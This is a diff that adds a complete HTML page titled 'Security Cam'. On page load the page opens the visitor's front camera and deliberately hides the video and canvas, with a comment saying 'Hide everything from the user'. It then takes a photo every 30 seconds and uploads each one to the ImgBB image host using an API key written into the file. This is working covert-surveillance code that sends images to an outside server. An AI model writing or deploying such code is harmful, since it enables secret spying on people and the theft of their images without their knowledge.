@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Cam</title>
+    <style>
+        /* Hide everything from the user */
+        body, video, canvas {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #000;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden video and canvas elements to capture the photo -->
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // --- CONFIGURATION ---
+        // PASTE YOUR IMGBB API KEY HERE
+        const API_KEY = '4b17233db072761756aba1bd626ee4a1'; 
+        
+        // Set the interval in milliseconds (e.g., 30000 = 30 seconds)
+        const CAPTURE_INTERVAL = 30000; 
+        // --- END CONFIGURATION ---
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Function to start the camera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, // 'user' is front camera, 'environment' is back
+                    audio: false 
+                });
+                video.srcObject = stream;
+                // Wait for the video stream to load
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    // Start taking photos after the camera is ready
+                    setInterval(captureAndUpload, CAPTURE_INTERVAL);
+                };
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        }
+
+        // Function to capture a photo and upload it
+        function captureAndUpload() {
+            // Draw the current video frame to the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert the canvas image to a Base64 data URL
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Upload to ImgBB
+            const formData = new FormData();
+            // ImgBB API expects the image data without the "data:image/jpeg;base64," part
+            const base64Image = imageData.split(',')[1]; 
+            formData.append('key', API_KEY);
+            formData.append('image', base64Image);
+            
+            fetch('https://api.imgbb.com/1/upload', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    console.log('Photo uploaded! URL:', result.data.url);
+                } else {
+                    console.error('Upload failed:', result);
+                }
+            })
+            .catch(error => {
+                console.error('Error uploading:', error);
+            });
+        }
+
+        // Start the camera when the page loads
+        window.addEventListener('load', startCamera);
+    </script>
+
+</body>
+</html>
